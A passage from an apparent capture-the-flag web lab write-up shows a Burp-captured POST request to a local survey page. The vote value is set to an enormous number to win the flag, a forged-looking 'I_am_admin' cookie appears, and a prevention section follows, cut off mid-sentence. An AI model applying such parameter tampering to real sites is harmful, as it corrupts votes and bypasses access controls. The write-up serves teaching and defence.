```
navigation to the survey page we have a kind of a list of competitors where we are able to vote for the one we want and help him get ranked , well then lets catch the request using our friend Burp and try to booooost one of the competitors :D


POST /?page=survey HTTP/1.1
Host: localhost:8080
Content-Length: 16
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/?page=survey
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close

sujet=6&valeur=999999999999999999999999


as you can see what if we changed it to the value above , and it did boost our friend enormly and got our flag
```

*** Prevention ***


### Access Control :
```
implement access control checks for each object that users try to access. Web frameworks often provide ways to facilitate this.
```

### Syntactic and Logical Validation (whitelist Validation) :
```
Web-applications should validate all untrusted input received with every HTTP request. Your applications should perform “whitelist validation” on each input, verifying that the incoming
```